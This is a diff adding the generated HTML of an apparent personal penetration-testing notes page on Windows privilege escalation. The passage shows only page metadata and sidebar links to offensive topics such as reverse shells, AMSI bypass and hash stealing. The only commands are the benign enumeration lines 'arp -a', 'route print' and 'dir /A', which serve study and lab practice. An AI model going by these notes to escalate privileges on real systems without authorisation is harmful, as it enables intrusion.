@@ -1,0 +1,3815 @@
+<!doctype html>
+<html lang="en" data-bs-theme="auto">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+<script 
+  src="/js/color-mode.f14b3e296de1d0b69e75af684b62a4a912a2cadab04e36123407cd8388204f1d.js"
+  integrity="sha256-8Us&#43;KW3h0Laeda9oS2KkqRKiytqwTjYSNAfNg4ggTx0=">
+</script>
+
+
+<link rel="stylesheet" href="/main.1542a5884e04a94d737f95f75653bbae5d9d951aeefab7705a9db5f7a85e58fed8b1c2f686c1303120bb66c4ac2cbfbf1317d05cde7d463eccc899dbb8088787.css" integrity="sha512-FUKliE4EqU1zf5X3VlO7rl2dlRru&#43;rdwWp2196heWP7YscL2hsEwMSC7ZsSsLL&#43;/ExfQXN59Rj7MyJnbuAiHhw==" crossorigin="anonymous">
+
+<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/notes/ad/local-privilege-escalation/windows-privesc/">
+
+  <link rel="canonical" href="http://localhost:1313/notes/ad/local-privilege-escalation/windows-privesc/">
+
+
+<title>windows-privesc  |  P4V1C</title>
+<meta name="description" content="">
+
+    
+    <link rel="icon" href="/favicon.ico" sizes="32x32">
+    
+      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+      <link
+        rel="apple-touch-icon"
+        href="/apple-touch-icon.png"
+        sizes="180x180"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-192x192.png"
+        sizes="192x192"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-512x512.png"
+        sizes="512x512"
+        type="image/png"
+      >
+<link rel="manifest" href="/manifest.webmanifest">
+
+<meta property="og:url" content="http://localhost:1313/notes/ad/local-privilege-escalation/windows-privesc/">
+  <meta property="og:site_name" content="P4V1C">
+  <meta property="og:title" content="windows-privesc">
+  <meta property="og:description" content="Information Gathering #Windows_Enumeration
+Network Information:
+arp -a route printList hidden file :
+cmd /c dir /AChange password of user">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2023-09-07T16:06:50+02:00">
+    <meta property="article:modified_time" content="2023-09-07T16:06:50+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="windows-privesc">
+  <meta name="twitter:description" content="Information Gathering #Windows_Enumeration
+Network Information:
+arp -a route printList hidden file :
+cmd /c dir /AChange password of user">
+      <meta name="twitter:site" content="@getdoks">
+
+    
+    
+    
+    <script type="application/ld+json">
+  {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "About Me",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/",
+       "name": "Notes",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/ad/",
+       "name": "Ad",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/ad/local-privilege-escalation/",
+       "name": "Local Privilege Escalation",
+       "position": 4
+     },
+     {
+       "@type": "ListItem",
+       "name": "Windows Privesc",
+       "position": 5
+     }
+   ]
+ }
+</script>
+
+
+
+
+
+</head>
+
+  
+  <body class="single section notes" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
+    <div class="sticky-top">
+<header class="navbar navbar-expand-lg">
+  <div class="container-lg">
+  
+    <a class="navbar-brand me-auto me-lg-3" href="/">P4V1C</a>
+
+    
+    
+    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <circle cx="10" cy="10" r="7"></circle>
+        <line x1="21" y1="21" x2="15" y2="15"></line>
+      </svg>
+    </button>
+    
+    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+      </svg>
+    </button>
+    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Notes</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="offcanvas-body">
+        <aside class="doks-sidebar mt-n3">
+          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
+            
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details open>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details open>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+          </nav>
+        </aside>
+      </div>
+    </div>
+    
+    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <line x1="4" y1="8" x2="20" y2="8"></line>
+        <line x1="4" y1="16" x2="20" y2="16"></line>
+      </svg>
+    </button>
+
+    
+    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">P4V1C</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+         </svg>
+        </button>
+      </div>
+      
+      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
+        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
+                <a class="nav-link active" href="http://localhost:1313/notes/ad/ad-cs" aria-current="true">Notes</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
+              </li>
+            </ul>
+
+        
+        
+        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <circle cx="10" cy="10" r="7"></circle>
+            <line x1="21" y1="21" x2="15" y2="15"></line>
+          </svg>
+        </button>
+        
+        
+        
+        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
+          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+          </svg>
+          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
+          </svg>
+        </button>
+        
+        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/thuliteio/doks"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
+            </li>
+          </ul>
+        
+        </div>
+    </div>
+
+    
+    </div>
+</header>
+</div>
+
+<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
+        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
+        <div class="search-input flex-grow-1 d-none">
+          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
+            <label for="query" class="visually-hidden">Search</label>
+            <div class="d-flex">
+              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
+              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="modal-body">
+        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
+        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
+        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
+        <div id="searchResults" class="search-results"></div>
+        <template>
+          <article class="search-result list-view">
+            <div class="card my-3">
+              <div class="card-body">
+                <header>
+                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
+                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
+                </header>
+                <div class="content">Summary here</div>
+              </div>
+            </div>
+          </article>
+        </template>
+      </div>
+      <div class="modal-footer">
+        <ul class="list-inline me-auto d-none d-md-block">
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
+        </ul>
+        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <div class="wrap container-lg" role="document">
+      <div class="content">
+      
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
+			
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details open>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details open>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
